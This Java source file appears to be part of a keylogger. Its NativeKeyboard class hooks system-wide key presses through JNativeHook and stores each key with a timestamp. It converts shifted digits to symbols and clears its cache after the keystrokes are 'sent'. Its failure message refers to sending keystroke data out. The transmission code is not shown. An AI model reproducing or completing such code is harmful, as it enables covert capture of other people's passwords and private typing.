package org.nick.keys;

import java.util.ArrayList;
import java.util.List;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.nick.handlers.KeyStorage;
import org.nick.handlers.Utils;

/**
 * 
 * @author NICK
 * This class will be responsible to cache key strokes
 * @param keyCache is used to store the keystrokes
 */
public class NativeKeyboard implements NativeKeyListener{

	private List<KeyStorage> keyCache = new ArrayList<>();
	
	public List<KeyStorage> getKeyCache() {
		return keyCache;
	}

	public void setKeyCache(List<KeyStorage> keyCache) {
		this.keyCache = keyCache;
	}

	@Override
	public void nativeKeyPressed(NativeKeyEvent e) {
        if(e.getKeyText(e.getKeyCode()).equals("Left Shift") || (e.getKeyText(e.getKeyCode()).equals("Right Shift")) ) {
			Utils.isShiftPressed = true;
		}
        String keyword = capitalizeOrMinimize(e.getKeyText(e.getKeyCode()));
        System.out.println(keyword);
    	keyCache.add(new KeyStorage(e.getKeyCode(), true, System.currentTimeMillis(), keyword));
		
	
	}
	@Override
	public void nativeKeyReleased(NativeKeyEvent e) {
		if(e.getKeyText(e.getKeyCode()).equals("Left Shift") || (e.getKeyText(e.getKeyCode()).equals("Right Shift")) ) {
			Utils.isShiftPressed = false;
		}
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent e) {
		// TODO Auto-generated method stub AsD hi my name is nick Nick is m!@#$%+_-=_1!@
		
	}
	
	public void onSend() {
		keyCache.clear(); //clears the cached keystrokes when sent
	}
	
	public void onFail() {
		System.out.println("KeyStroke data  failed to be sent");
	}
	
	
		private static String capitalizeOrMinimize(String key) {
			if(Utils.isShiftPressed) {
				if(key.equals("1")){
				   return "!";
				}
				else if(key.equals("2")) {
					return "@";
				}
				else if(key.equals("3")) {
					return "#";
				}
				else if(key.equals("4")) {
					return "$";
				}
				else if(key.equals("5")) {
					return "%";
				}
				else if(key.equals("6")) {
					return "^";
				}
				else if(key.equals("7")) {
					return "&";
				}
				else if(key.equals("8")) {
					return "*";
				}
				else if(key.equals("9")) {
					return "(";
				}
				else if(key.equals("0")) {
					return ")";
				}
				else {
					return key.toUpperCase();
				}
			}
			else {
				return key.toLowerCase();
			}
		}

}
